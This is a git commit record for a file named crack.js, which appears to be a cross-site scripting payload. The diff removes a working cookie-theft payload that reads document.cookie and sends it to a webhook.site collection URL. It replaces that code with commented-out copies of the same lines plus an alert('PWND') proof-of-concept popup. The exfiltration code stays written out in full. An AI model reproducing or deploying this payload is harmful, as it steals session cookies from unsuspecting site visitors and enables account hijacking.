74313edc7b28286b63dd6c4263e698f0cf4c60ef
Anthony <109983457+c3rrberu5@users.noreply.github.com>
2026-01-20 08:28:21 -0500

    Disable cookie fetch and add alert
    Comment out cookie fetching and alert user.

--- crack.js
+++ crack.js
@@ -1,4 +1,4 @@
-var cookie= document.cookie;
-var url="https://webhook.site/15bfd249-6ca6-4298-8ddf-ba347edbe7ae/?klk=" +cookie;
-
-fetch(url);
+//var cookie= document.cookie;
+//var url="https://webhook.site/15bfd249-6ca6-4298-8ddf-ba347edbe7ae/?klk=" +cookie;
+alert("PWND");
+//fetch(url);
